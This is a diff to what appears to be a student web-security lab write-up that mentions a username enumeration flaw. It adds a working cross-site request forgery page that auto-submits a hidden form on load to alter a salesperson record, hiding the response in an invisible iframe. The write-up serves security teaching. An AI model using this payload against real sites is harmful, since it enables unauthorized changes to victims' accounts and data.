@@ -30,4 +30,25 @@ As you can see from above, the Green Website has the Username Enumeration error 
 The "failure" class is applied an bold style in css while "failed" class doesn't.
 
 # Red
+Vulnerability #1: Cross-Site Request Forgery (CSRF)
+![](CSRF.gif)
+Created a malicious page that utilizes the user's session to forge a request to the database:
+
+<html>
+<head>
+<title>NOT A FAKE FORM</title>
+</head>
+<body onload="document.my_form.submit()">
+<form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=3" method="POST" name="my_form" style="display: none;" target="hidden_results" >
+<input type="text" name="first_name" value="You Fool!" />
+<input type="text" name="last_name" value="Sorry_Mr.Barker" />
+<input type="text" name="phone" value="777-777-7778" />
+<input type="text" name="email" value="TROLLED@TORLLED.COM" />
+</form>
+<iframe name="hidden_results" style="display: none;"></iframe>
+</body>
+</html>
+
+This page secretly makes a post request on page load and hides the outcome in a hidden iframe.
+ As result, an account in the database is altered.
 
